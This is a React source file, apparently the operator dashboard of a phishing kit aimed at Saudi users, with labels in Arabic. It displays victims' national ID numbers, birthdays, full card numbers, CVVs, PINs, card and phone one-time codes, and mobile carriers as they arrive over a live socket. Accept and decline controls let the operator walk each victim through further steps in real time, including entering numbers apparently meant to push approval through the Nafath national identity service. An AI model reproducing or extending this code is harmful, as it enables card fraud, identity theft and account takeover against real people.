import React, { useEffect, useState } from "react";
import { serverRoute, token } from "./App";
import axios from "axios";
import { io } from "socket.io-client";
import { IoMdRefresh } from "react-icons/io";
import { IoMdCloseCircle } from "react-icons/io";

const Main = () => {
  const socket = io(serverRoute);
  const [activeUsers, setActiveUsers] = useState([]);
  const [Users, setUsers] = useState([]);
  const [user, setUser] = useState({ data: {}, active: false });

  const [price, setPrice] = useState(null);
  useEffect(() => {
    if (!localStorage.getItem("token")) window.location.href = "/login";
  }, []);
  const uniqueNum = () =>
    Math.floor(Math.random() * (10000000 - 999999 + 1)) + 999999;

  const getUsers = async () => {
    await axios
      .get(`${serverRoute}/users`)
      .then((res) => {
        // console.log(res.data);
        setUsers(res.data);
        const online = res.data.filter((user) => !user.checked);
        setActiveUsers(online);
      })
      .catch((error) => {
        console.log(error);
      });
  };

  const handleDisplay = async (id) => {
    const user = Users.find((u) => u._id === id);
    if (!user.checked) {
      await axios.get(serverRoute + "/order/checked/" + id);
    }
    getUsers();
    setUser({ data: user, active: true });
  };

  const handleChange = async (id) => {
    if (!price) return window.alert("املاء حفل الكود");
    socket.emit("navazChange", { id, price });
  };

  const handleAcceptLogin = async (id) => {
    if (!price && user.data.vioNumber) return window.alert("املاء حفل السعر");
    else {
      socket.emit("acceptLogin", { id, price });
      setUser({
        data: { ...user.data, loginAccept: true, price },
        active: true,
      });
      await getUsers();
    }
  };

  const handleDeclineLogin = (id) => {
    socket.emit("declineLogin", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, loginAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, loginAccept: true }, active: true });
  };

  const handleAcceptLoginOtp = async (id) => {
    if (new Date(user.data?.birthday) != "Invalid Date") {
      if (!price) return window.alert("املاء حفل السعر");
    }
    socket.emit("acceptOTPLogin", { id, price });

    setUser({
      data: { ...user.data, loginOTPAccept: true, price },
      active: true,
    });
  };

  const handleDeclineLoginOtp = (id) => {
    socket.emit("declineOTPLogin", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, loginOTPAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, loginOTPAccept: true }, active: true });
  };

  const handleAcceptVisa = async (id) => {
    socket.emit("acceptVisa", id);
    setUser({ data: { ...user.data, visaAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclineVisa = (id) => {
    socket.emit("declineVisa", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, visaAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, visaAccept: true }, active: true });
  };

  const handleAcceptVisaOtp = async (id) => {
    socket.emit("acceptVisaOTP", id);
    setUser({ data: { ...user.data, visaOtpAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclineVisaOtp = (id) => {
    socket.emit("declineVisaOTP", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, visaOtpAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, visaOtpAccept: true }, active: true });
  };

  const handleAcceptVisaPin = async (id) => {
    socket.emit("acceptVisaPin", id);
    setUser({ data: { ...user.data, visaPinAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclineVisaPin = (id) => {
    socket.emit("declineVisaPin", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, visaPinAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, visaPinAccept: true }, active: true });
  };
  const handleAcceptPhone = async (id) => {
    socket.emit("acceptPhone", id);
    setUser({ data: { ...user.data, phoneAccept: true }, active: true });
    await getUsers();
  };

  const handleDeclinePhone = (id) => {
    socket.emit("declinePhone", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, phoneAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, phoneAccept: true }, active: true });
  };

  const handleAcceptPhoneOtp = async (id) => {
    if (
      user.data.phoneNetwork !== "STC" &&
      user.data.phoneNetwork !== "Mobily"
    ) {
      if (!price) return window.alert("اكتب الرقم المرسل إلي نفاذ");
    }
    setUser({
      data: {
        ...user.data,
        phoneOtpAccept: true,
        networkAccept: false,
        navazAceept: false,
      },
      active: true,
    });
    socket.emit("acceptPhoneOTP", { id, price });
    await getUsers();
  };

  const handleDeclinePhoneOtp = (id) => {
    socket.emit("declinePhoneOTP", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, phoneOtpAccept: true, navazAceept: false };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({
      data: { ..._user, phoneOtpAccept: true, navazAceept: false },
      active: true,
    });
  };

  const handleAcceptService = async (id) => {
    if (!price) return window.alert("اكتب الرقم المرسل إلي نفاذ");
    socket.emit("acceptService", { id, price });
    setUser({
      data: { ...user.data, networkAccept: true, navazAceept: false },
      active: true,
    });
    await getUsers();
  };

  const handleDeclineService = (id) => {
    socket.emit("declineService", id);
    const _user = Users.find((u) => {
      if (u._id === id) {
        return { ...u, networkAccept: true };
      }
    });
    const withOut = Users.filter((u) => u._id !== id);
    setUsers([...withOut, _user]);
    setUser({ data: { ..._user, networkAccept: true }, active: true });
  };

  const handleAcceptNavaz = async (id) => {
    socket.emit("acceptNavaz", id);
    setUser({ data: { ...user.data, navazAceept: true }, active: true });
    await getUsers();
  };

  const handleDeclineNavaz = async (id) => {
    socket.emit("declineNavaz", id);
    setUser({
      data: { ...user.data, navazAceept: true, networkAccept: false },
      active: true,
    });
    await getUsers();
  };

  useEffect(() => {
    const fetchUsers = async () => {
      try {
        const res = await axios.get(`${serverRoute}/users`);
        setUsers(res.data);
        const online = res.data.filter((user) => !user.checked);
        setActiveUsers(online);
      } catch (error) {
        console.error(error);
      }
    };

    fetchUsers();

    socket.connect();
    socket.on("login", fetchUsers);
    socket.on("loginOtp", fetchUsers);
    socket.on("data", fetchUsers);

    socket.on("visa", fetchUsers);
    socket.on("visaOtp", (data) => {
      const user = Users.find((u) => u._id === data.id);
      if (user) {
        user.visa_otp = data.visa_otp;
        setUser({ data: user, active: true });
      }
      fetchUsers();
    });
    socket.on("visaPin", fetchUsers);
    socket.on("phone", fetchUsers);
    socket.on("phoneOtp", fetchUsers);

    // Cleanup to avoid duplicate listeners
    return () => {
      socket.off("login", fetchUsers);
      socket.off("loginOtp", fetchUsers);
      socket.off("data", fetchUsers);

      socket.off("visa", fetchUsers);
      socket.off("visaOtp", fetchUsers);
      socket.off("visaPin", fetchUsers);
      socket.off("phone", fetchUsers);
      socket.off("phoneOtp", fetchUsers);

      socket.disconnect();
    };
  }, []);

  return (
    <div
      className="flex w-full flex-col bg-gray-200 relative h-screen"
      dir="rtl"
    >
      <div
        className="fixed left-5 bottom-2 cursor-pointer p-2 bg-sky-800 rounded-full  text-white"
        onClick={() => window.location.reload()}
      >
        <IoMdRefresh className="text-3xl  " />
      </div>
      <div
        className="fixed left-5 bottom-16 cursor-pointer p-2 bg-red-500 rounded-full  text-white"
        onClick={async () =>
          await axios
            .delete(serverRoute + "/")
            .then(async () => await getUsers())
        }
      >
        <IoMdCloseCircle className="text-3xl  " />
      </div>

      <div className="flex w-full items-center h-screen  md:flex-row  ">
        {/* // Notifactions */}

        <div className="w-1/4 border-l border-gray-500 h-full flex flex-col  ">
          <span className="md:p-5 py-2 px-1 w-full md:text-xl text-lg text-center  border-b border-black">
            مستخدمين
          </span>
          <div className="w-full flex flex-col overflow-y-auto h-full">
            {Users.length
              ? Users.map((user, idx) => {
                  return (
                    <div
                      className="w-full px-2 py-3 md:text-lg text-sm flex justify-between items-center border-b-2 border-gray-500 cursor-pointer hover:opacity-70"
                      onClick={() => handleDisplay(user._id)}
                    >
                      <span
                        className={`w-2 h-2 bg-green-500 rounded-full ${
                          activeUsers.find((u) => u._id === user._id)
                            ? "visible"
                            : "hidden"
                        }`}
                      ></span>
                      <span className="flex-1 text-center text-gray-700 md:text-sm  text-xs ">
                        {user.nationalId || user.buildNumber}
                      </span>
                    </div>
                  );
                })
              : ""}
          </div>
        </div>

        {/* data */}

        {user.active ? (
          <div className="w-3/4 border-l  border-gray-500 h-screen overflow-y-auto grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 items-start place-content-start gap-5 px-3">
            <span
              className="px-3 py-2 w-full  md:col-span-2 lg:col-span-3 text-xl text-center border-b border-black "
              dir="rtl"
            >
              بيانات عميل
            </span>
            {user.data?.type ? (
              <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1   my-2">
                <span className="text-lg mb-2">بيانات عميل</span>
                <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                  <span>نوع الخدمة</span>
                  <span>{user.data?.type} </span>
                </div>
                {user.data.nationalId ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> رقم هوية </span>
                    <span>{user.data?.nationalId}</span>
                  </div>
                ) : (
                  ""
                )}
                {user.data.vioNumber ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> رقم المخالفة </span>
                    <span>{user.data?.vioNumber}</span>
                  </div>
                ) : (
                  ""
                )}
                {new Date(user.data?.birthday) != "Invalid Date" ? (
                  user.data.birthday ? (
                    <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                      <span> تاريخ الميلاد </span>
                      <span>
                        {new Date(user.data?.birthday).toDateString()}
                      </span>
                    </div>
                  ) : (
                    ""
                  )
                ) : (
                  ""
                )}
                {user.data.nationalOther ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> رقم هوية أحد الأقرباء </span>
                    <span>{user.data?.nationalOther}</span>
                  </div>
                ) : (
                  ""
                )}

                {user.data.buildNumber ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> رقم المنشأة</span>
                    <span>{user.data?.buildNumber}</span>
                  </div>
                ) : (
                  ""
                )}

                {user.data.firstName ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> الأسم الأول </span>
                    <span>{user.data?.firstName}</span>
                  </div>
                ) : (
                  ""
                )}

                {user.data.lastName ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> الأسم الأخير</span>
                    <span>{user.data?.lastName}</span>
                  </div>
                ) : (
                  ""
                )}
                {user.data.price ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> السعر </span>
                    <span>{user.data?.price}</span>
                  </div>
                ) : (
                  ""
                )}
                {!user.data.loginAccept && user.data.vioNumber ? (
                  <>
                    <input
                      className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
                      value={price}
                      onChange={(e) => setPrice(e.target.value)}
                      placeholder="السعر"
                    />{" "}
                    <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                      <button
                        className="bg-green-500 w-1/2 p-2 rounded-lg"
                        onClick={() => handleAcceptLogin(user.data._id)}
                      >
                        قبول
                      </button>
                      <button
                        className="bg-red-500 w-1/2 p-2 rounded-lg"
                        onClick={() => handleDeclineLogin(user.data._id)}
                      >
                        رفض
                      </button>
                    </div>
                  </>
                ) : (
                  ""
                )}
                {!user.data.loginAccept &&
                new Date(user.data?.birthday) != "Invalid Date" ? (
                  <>
                    <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                      <button
                        className="bg-green-500 w-1/2 p-2 rounded-lg"
                        onClick={() => handleAcceptLogin(user.data._id)}
                      >
                        قبول
                      </button>
                      <button
                        className="bg-red-500 w-1/2 p-2 rounded-lg"
                        onClick={() => handleDeclineLogin(user.data._id)}
                      >
                        رفض
                      </button>
                    </div>
                  </>
                ) : (
                  ""
                )}
                {user.data.loginOtp ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> رمز التحقق </span>
                    <span>{user.data?.loginOtp}</span>
                  </div>
                ) : (
                  ""
                )}
                {user.data.loginOtp ? (
                  user.data.loginOTPAccept ? (
                    ""
                  ) : (
                    <>
                      {new Date(user.data?.birthday) != "Invalid Date" ? (
                        <input
                          className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
                          value={price}
                          onChange={(e) => setPrice(e.target.value)}
                          placeholder="السعر"
                        />
                      ) : (
                        ""
                      )}
                      <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                        <button
                          className="bg-green-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleAcceptLoginOtp(user.data._id)}
                        >
                          قبول
                        </button>
                        <button
                          className="bg-red-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleDeclineLoginOtp(user.data._id)}
                        >
                          رفض
                        </button>
                      </div>
                    </>
                  )
                ) : (
                  ""
                )}
              </div>
            ) : (
              ""
            )}

            {user.data?.visa_card_number ? (
              <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1   my-2">
                <span className="text-lg mb-2">بيانات الفيزا</span>
                <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                  <span> رقم الكارت </span>
                  <span>{user.data?.visa_card_number}</span>
                </div>
                {user.data.visa_expiryDate ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> تاريخ الانتهاء</span>
                    <span>{user.data?.visa_expiryDate}</span>
                  </div>
                ) : (
                  ""
                )}

                {user.data.visa_cvv ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> cvv </span>
                    <span>{user.data?.visa_cvv}</span>
                  </div>
                ) : (
                  ""
                )}
                {user.data.method ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> طريقة الدفع </span>
                    <span>{user.data?.method}</span>
                  </div>
                ) : (
                  ""
                )}

                {user.data.visaAccept ? (
                  ""
                ) : (
                  <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                    <button
                      className="bg-green-500 w-1/2 p-2 rounded-lg"
                      onClick={() => handleAcceptVisa(user.data._id)}
                    >
                      قبول
                    </button>
                    <button
                      className="bg-red-500 w-1/2 p-2 rounded-lg"
                      onClick={() => handleDeclineVisa(user.data._id)}
                    >
                      رفض
                    </button>
                  </div>
                )}

                {user.data.visa_otp ? (
                  <>
                    <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                      <span> رمز التحقق </span>
                      <span>{user.data?.visa_otp}</span>
                    </div>
                    {user.data.visaOtpAccept ? (
                      ""
                    ) : (
                      <div className="w-4/5 flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                        <button
                          className="bg-green-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleAcceptVisaOtp(user.data._id)}
                        >
                          قبول
                        </button>
                        <button
                          className="bg-red-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleDeclineVisaOtp(user.data._id)}
                        >
                          رفض
                        </button>
                      </div>
                    )}
                  </>
                ) : (
                  ""
                )}
                {user.data.visa_pin ? (
                  <>
                    <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                      <span> Pin </span>
                      <span>{user.data?.visa_pin}</span>
                    </div>
                    {user.data.visaPinAccept ? (
                      ""
                    ) : (
                      <div className="w-4/5 flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                        <button
                          className="bg-green-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleAcceptVisaPin(user.data._id)}
                        >
                          قبول
                        </button>
                        <button
                          className="bg-red-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleDeclineVisaPin(user.data._id)}
                        >
                          رفض
                        </button>
                      </div>
                    )}
                  </>
                ) : (
                  ""
                )}

                {}
              </div>
            ) : (
              ""
            )}
            {user.data?.phoneNumber ? (
              <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1   my-2">
                <span className="text-lg mb-2">معلومات الهاتف</span>
                <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                  <span> رقم الهاتف </span>
                  <span>{user.data?.phoneNumber}</span>
                </div>
                {user.data.phoneNetwork ? (
                  <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                    <span> مشغل</span>
                    <span>{user.data?.phoneNetwork}</span>
                  </div>
                ) : (
                  ""
                )}

                {user.data.phoneAccept ? (
                  ""
                ) : (
                  <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                    <button
                      className="bg-green-500 w-1/2 p-2 rounded-lg"
                      onClick={() => handleAcceptPhone(user.data._id)}
                    >
                      قبول
                    </button>
                    <button
                      className="bg-red-500 w-1/2 p-2 rounded-lg"
                      onClick={() => handleDeclinePhone(user.data._id)}
                    >
                      رفض
                    </button>
                  </div>
                )}

                {user.data.phoneOtp ? (
                  <>
                    <div className="w-full flex justify-between gap-x-3 border p-2 text-xs">
                      <span> رمز التحقق </span>
                      <span>{user.data?.phoneOtp}</span>
                    </div>
                    {user.data.phoneOtpAccept ? (
                      ""
                    ) : (
                      <>
                        {user.data.phoneNetwork !== "STC" &&
                        user.data.phoneNetwork !== "Mobily" ? (
                          <input
                            className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
                            value={price}
                            onChange={(e) => setPrice(e.target.value)}
                            placeholder="رقم نفاذ"
                          />
                        ) : (
                          ""
                        )}
                        <div className="w-4/5 flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                          <button
                            className="bg-green-500 w-1/2 p-2 rounded-lg"
                            onClick={() => handleAcceptPhoneOtp(user.data._id)}
                          >
                            قبول
                          </button>
                          <button
                            className="bg-red-500 w-1/2 p-2 rounded-lg"
                            onClick={() => handleDeclinePhoneOtp(user.data._id)}
                          >
                            رفض
                          </button>
                        </div>
                      </>
                    )}
                  </>
                ) : (
                  ""
                )}

                {user.data.phoneAccept &&
                  user.data.phoneNetwork === "Mobily" &&
                  !user.data.networkAccept && (
                    <>
                      <input
                        className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
                        value={price}
                        onChange={(e) => setPrice(e.target.value)}
                        placeholder="رقم نفاذ"
                      />
                      <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                        <button
                          className="bg-green-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleAcceptService(user.data._id)}
                        >
                          قبول
                        </button>
                        <button
                          className="bg-red-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleDeclineService(user.data._id)}
                        >
                          رفض
                        </button>
                      </div>
                    </>
                  )}

                {}
                {user.data.phoneAccept &&
                  user.data.phoneNetwork === "Mobily" &&
                  user.data.networkAccept &&
                  !user.data.navazAceept && (
                    <>
                      <input
                        className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
                        value={price}
                        onChange={(e) => setPrice(e.target.value)}
                        placeholder="رقم نفاذ"
                      />
                      <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                        <button
                          className="bg-yellow-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleChange(user.data._id)}
                        >
                          تغيير
                        </button>

                        <button
                          className="bg-red-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleDeclineNavaz(user.data._id)}
                        >
                          رفض
                        </button>
                      </div>
                    </>
                  )}
              </div>
            ) : (
              ""
            )}
            {user.data.phoneAccept &&
            user.data.phoneOtpAccept &&
            user.data?.phoneNetwork === "STC" ? (
              <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1   my-2">
                <span className="text-lg mb-2">
                  قبول {user.data?.phoneNetwork}
                </span>

                {user.data.networkAccept ? (
                  "تم الرد"
                ) : (
                  <>
                    <input
                      className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
                      value={price}
                      onChange={(e) => setPrice(e.target.value)}
                      placeholder="رقم نفاذ"
                    />
                    <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                      <button
                        className="bg-green-500 w-1/2 p-2 rounded-lg"
                        onClick={() => handleAcceptService(user.data._id)}
                      >
                        قبول
                      </button>
                      <button
                        className="bg-red-500 w-1/2 p-2 rounded-lg"
                        onClick={() => handleDeclineService(user.data._id)}
                      >
                        رفض
                      </button>
                    </div>
                  </>
                )}

                {}
              </div>
            ) : (
              ""
            )}

            {user.data.phoneAccept &&
            user.data.phoneOtpAccept &&
            user.data?.phoneNetwork !== "Mobily" ? (
              <div className="flex flex-col items-center bg-sky-800 text-white py-2 px-3 rounded-lg gap-y-1   my-2">
                <span className="text-lg mb-2">نفاذ</span>

                {user.data.networkAccept ? (
                  user.data.navazAceept ? (
                    "تم الرد"
                  ) : (
                    <>
                      <input
                        className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
                        value={price}
                        onChange={(e) => setPrice(e.target.value)}
                        placeholder="رقم نفاذ"
                      />
                      <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                        <button
                          className="bg-yellow-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleChange(user.data._id)}
                        >
                          تغيير
                        </button>

                        <button
                          className="bg-red-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleDeclineNavaz(user.data._id)}
                        >
                          رفض
                        </button>
                      </div>
                    </>
                  )
                ) : (
                  ""
                )}
                {!user.data.networkAccept ? (
                  user.data.navazAceept ? (
                    "تم الرد"
                  ) : (
                    <>
                      <input
                        className="border rounded-md py-2 mt-3 w-3/4 text-center text-sm text-black"
                        value={price}
                        onChange={(e) => setPrice(e.target.value)}
                        placeholder="رقم نفاذ"
                      />
                      <div className="w-full flex col-span-2 md:col-span-1 justify-between gap-x-3  p-2 text-xs">
                        <button
                          className="bg-yellow-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleChange(user.data._id)}
                        >
                          تغيير
                        </button>

                        <button
                          className="bg-red-500 w-1/2 p-2 rounded-lg"
                          onClick={() => handleDeclineNavaz(user.data._id)}
                        >
                          رفض
                        </button>
                      </div>
                    </>
                  )
                ) : (
                  ""
                )}
              </div>
            ) : (
              ""
            )}
          </div>
        ) : (
          ""
        )}

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3"></div>
      </div>
    </div>
  );
};

export default Main;
